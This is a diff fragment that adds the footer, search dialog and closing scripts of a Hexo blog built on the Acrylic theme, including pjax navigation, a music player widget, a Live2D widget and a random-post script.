+            <i class="fa-brands fa-github"></i>
+        </a>
+    
+        <a class="deal_link" href="mailto:tangyt2406@163.com" rel="external nofollow" title="Mail">
+            <i class="fa-solid fa-envelope"></i>
+        </a>
+    
+    <img class="footer_mini_logo" src="/img/avatar.webp"
+        title="返回顶部" onclick="acrylic.toTop()">
+    
+        <a class="deal_link" target="_blank" href="https://music.163.com" rel="external nofollow noopener" title="网易云">
+            <i class="fa-solid fa-music"></i>
+        </a>
+    
+        <a class="deal_link" target="_blank" href="https://space.bilibili.com" rel="external nofollow noopener" title="bilibili">
+            <i class="fa-brands fa-bilibili"></i>
+        </a>
+    
+</div>    
+<div id="heo-footer">
+    
+        <div class="footer-group">
+            <h3 class="footer-title">导航</h3>
+            <div class="footer-links">
+                
+                    <a class="footer-item" href="/archives/" title="文章归档" rel="noopener external nofollow noreferrer">文章归档</a>
+                
+                    <a class="footer-item" href="/categories/" title="文章分类" rel="noopener external nofollow noreferrer">文章分类</a>
+                
+                    <a class="footer-item" href="/tags/" title="文章标签" rel="noopener external nofollow noreferrer">文章标签</a>
+                    
+            </div>
+        </div>
+    
+        <div class="footer-group">
+            <h3 class="footer-title">服务</h3>
+            <div class="footer-links">
+                
+                    <a class="footer-item" target="_blank" href="https://51.la/" title="51la统计" rel="noopener external nofollow noreferrer noopener">51la统计</a>
+                
+                    <a class="footer-item" target="_blank" href="https://tongji.baidu.com/" title="百度统计" rel="noopener external nofollow noreferrer noopener">百度统计</a>
+                
+                    <a class="footer-item" target="_blank" href="https://ql.tianli0.top/" title="TianliCDN" rel="noopener external nofollow noreferrer noopener">TianliCDN</a>
+                    
+            </div>
+        </div>
+    
+        <div class="footer-group">
+            <h3 class="footer-title">Acrylic</h3>
+            <div class="footer-links">
+                
+                    <a class="footer-item" target="_blank" href="https://acrylic.zhheo.com/" title="主题官网" rel="noopener external nofollow noreferrer noopener">主题官网</a>
+                
+                    <a class="footer-item" target="_blank" href="https://github.com/hexo-theme-Acrylic/Hexo-Theme-Acrylic" title="Github" rel="noopener external nofollow noreferrer noopener">Github</a>
+                
+                    <a class="footer-item" target="_blank" href="https://blog.zhheo.com/" title="Heo" rel="noopener external nofollow noreferrer noopener">Heo</a>
+                    
+            </div>
+        </div>
+    
+    
+</div>
+<div id="footer-section">
+    <div class="footer-section-links">
+        <div class="footer-section-left">
+            <div id="footer-section-tips">
+                <div class="copyright">©2021 - 2023 By 
+                    <a class="footer-section-link" href="/" rel="external nofollow">tangyitao</a>
+                    <a class="footer-section-link" href="https://github.com/hexo-theme-Acrylic/Hexo-Theme-Acrylic-Next" rel="external nofollow" target="_blank"> Theme By Acrylic-Next</a>
+                    <a class="footer-section-link" href="" rel="external nofollow" target="_blank"></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-section-right">
+            <a class="footer-section-link" href="">订阅</a>
+            
+            <a class="footer-section-link cc" target="_blank" href="https://creativecommons.org/licenses/by/4.0/" title="cc协议">
+                <i class="fas fa-closed-captioning"></i>
+            </a>
+        </div>
+    </div>
+</div>
+                </footer>
+            </div>
+         
+        <div>
+    <script type="text/javascript" src="/js/utils.js"></script>
+    <script type="text/javascript" src="/js/main.js"></script>
+    
+
+<script src="/lib/pjax.min.js"></script>
+
+
+
+<script src="/lib/snackbar.min.js"></script>
+
+
+    
+<script src="/lib/view-image.min.js"></script>
+
+
+
+<div id="js-pjax">
+    
+     
+</div>
+
+    
+<link rel="stylesheet" href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css">
+
+    
+<script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script>
+
+    
+<script src="/lib/meting.min.js"></script>
+
+    <script>
+        var meting_api = "https://music.startly.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r";
+    </script>
+
+
+    
+<script src="/js/extend/covercolor/web.js"></script>
+
+        
+
+
+
+    <script>
+  let pjaxSelectors = [
+    'title',
+    '#body-wrap',
+    '#site-config',
+    'meta[name="description"]',
+    '#js-pjax'
+  ]
+  
+  const pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+  })
+
+  document.addEventListener('pjax:error', (e) => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+</script>
+    
+</div>
+        
+    <div id="local-search">
+    <div class="search-dialog">
+        <nav class="search-nav">
+            <span class="search-dialog-title">搜索</span>
+            <button class="search-close-button">
+                <i class="fas fa-times"></i>
+            </button>
+        </nav>
+        <div id="loading-database">
+            <i class="fas fa-spinner fa-pulse"></i>
+            <span>加载中</span>
+        </div>
+        <div class="search-wrap">
+            <div class="search-box">
+                <input class="search-box-input" placeholder="输入关键词快速查找" type="text" id="search-input" autocomplete="off" spellcheck="false" autocorrect="off" autocapitalize="off">
+            </div>
+            <div id="loading-status"></div>
+            <div id="search-results"></div>
+        </div>
+    </div>
+    <div id="search-mask"></div>
+</div>
+    
+<link rel="stylesheet" href="/css/search/local-search.css">
+
+    
+<script src="/js/extend/search/local-search.js"></script>
+
+
+     
+        <div class="needEndHide" id="nav-music" onclick="acrylic.musicToggle()">
+    <div id="nav-music-hoverTips">音乐已暂停</div>
+    <meting-js id="1708664797" server="tencent" type="playlist" mutex="true"
+        preload="none" data-lrctype="0" order="random" theme="var(--heo-main)"></meting-js>
+</div>
+    
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/ni-j.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
+<script>const posts=["posts/b873a1b0.html","posts/75ee909c.html","posts/36b478da.html","posts/e3a7e431.html","posts/fe26ac5e.html","posts/d0edc1ed.html","posts/b6c3d8dd.html","posts/49fbbc1.html","posts/30ab1de7.html","posts/5696223f.html","posts/78beed92.html","posts/e770b956.html","posts/106f1f3a.html","posts/36b2021f.html","posts/442d16e2.html","posts/56431718.html","posts/72090044.html","posts/10c232a9.html","posts/7ec55fd4.html","posts/9acb5cb3.html","posts/689338cf.html","posts/78033e99.html","posts/7c236f69.html","posts/fdb654f7.html","posts/fde62576.html","posts/4906c062.html","posts/71d3dda2.html","posts/44d90ad5.html","posts/97b300c3.html","posts/2077d398.html","posts/b634f675.html","posts/5a112392.html","posts/d75d39a7.html","posts/6abf1536.html","posts/964f8f69.html","posts/dcd9e6db.html","posts/92a4644d.html","posts/1bdcf24b.html","posts/75330943.html","posts/f3c7bc8f.html","posts/839af433.html","posts/94962b3f.html","posts/7856357f.html","posts/2606c6a9.html","posts/91f012d1.html","posts/6c2ee665.html","posts/ee40a19d.html","posts/26f88c40.html","posts/a5005a49.html","posts/9542c7f4.html","posts/47d2f7a2.html","posts/bb085914.html","posts/4e57a7dc.html","posts/62f2aa05.html","posts/a6592200.html","posts/303fc3a3.html","posts/e15cda61.html","posts/917a39c3.html","posts/4369ac96.html","posts/7f6e5a2.html"];function toRandomPost(){ window.pjax ? pjax.loadUrl('/'+posts[Math.floor(Math.random()*posts.length)]) : window.open('/'+posts[Math.floor(Math.random()*posts.length)], "_self"); };</script>
